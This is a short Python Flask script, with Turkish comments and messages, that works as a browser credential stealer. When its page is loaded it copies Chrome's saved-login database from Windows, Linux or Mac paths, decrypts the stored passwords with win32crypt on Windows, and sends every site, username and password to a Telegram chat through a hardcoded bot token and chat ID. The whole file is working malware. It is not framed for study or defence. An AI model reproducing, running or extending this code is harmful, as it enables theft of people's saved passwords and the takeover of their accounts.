# app.py (PC ROOTSUZ)
from flask import Flask
import telebot
import os
import sqlite3
import json
import base64
import win32crypt  # Windows
# import cryptography  # Mac/Linux

app = Flask(__name__)
bot = telebot.TeleBot("8258388271:AAEr5lwYGZppBtSRy-c3wXCWu4Dr_GwASfI")
CHAT_ID = 7323434112

@app.route('/')
def home():
    bot.send_message(CHAT_ID, "REİS, PC CHROME ŞİFRELERİ ÇEKİLİYOR...")

    # Otomatik yol bul
    paths = [
        os.path.expanduser("~/AppData/Local/Google/Chrome/User Data/Default/Login Data"),
        os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
        os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/Login Data")
    ]

    for db_path in paths:
        if not os.path.exists(db_path): continue
        try:
            # Kopyala
            import shutil
            shutil.copy(db_path, "temp.db")
            conn = sqlite3.connect("temp.db")
            cur = conn.cursor()
            cur.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, enc in cur.fetchall():
                try:
                    pwd = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode()
                except:
                    pwd = "[Mac/Linux decrypt]"
                bot.send_message(CHAT_ID, f"Site: {url}\nUser: {user}\nPass: {pwd}\n")
            conn.close()
            os.remove("temp.db")
            bot.send_message(CHAT_ID, "25 ŞİFRE TAMAM REİS! ✅")
            return "Şifreler Telegram’da!"
        except: pass

    bot.send_message(CHAT_ID, "Chrome kapalı mı? Tekrar dene.")
    return "Hata reis, Chrome’u kapatıp tekrar tıkla."
